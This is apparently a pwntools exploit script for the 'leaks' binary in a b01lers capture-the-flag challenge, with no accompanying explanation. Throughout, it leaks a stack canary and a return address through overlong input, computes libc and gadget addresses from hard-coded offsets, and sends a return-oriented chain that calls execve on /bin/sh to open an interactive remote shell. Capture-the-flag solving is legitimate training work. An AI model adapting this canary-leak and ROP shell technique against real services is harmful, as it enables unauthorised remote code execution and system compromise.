#!/usr/bin/python3
from pwn import *

p = remote( 'chal.ctf.b01lers.com', '1009')
#p = process ('/home/pooty/shared/biolers/leaks')
#input('attach')

p.sendline('15')
p.sendline('a'*15)
p.sendline('24')
p.sendline('a'*24)
p.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaa\n')
canary = p.recv(7)
canary = b'\x00' + canary

p.sendline('39')
p.sendline('a'*0x28)
p.recvuntil('a'*0x28)
ret = p.recv(6) + b'\x00\x00' 

print(hex(u64(ret)))
main    = u64(ret) - 0x2AAAA28A8E10
libcbase= u64(ret) - 0x270B3
execve  = libcbase + 0xe62f0
system  = u64(ret) + 0x2E35D
binsh   = u64(ret) + 0x1904F7
poprdi  = libcbase + 0x26b72
poprsi  = libcbase + 0x27529

padding = b'\x90' * 0x18
exploit = padding
exploit += canary
exploit += b'aaaaaaaa'
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(poprsi)
exploit += p64(0)
exploit += p64(execve)

p.sendline('128')
p.sendline(exploit + (128-len(exploit))*b'a')

p.interactive()
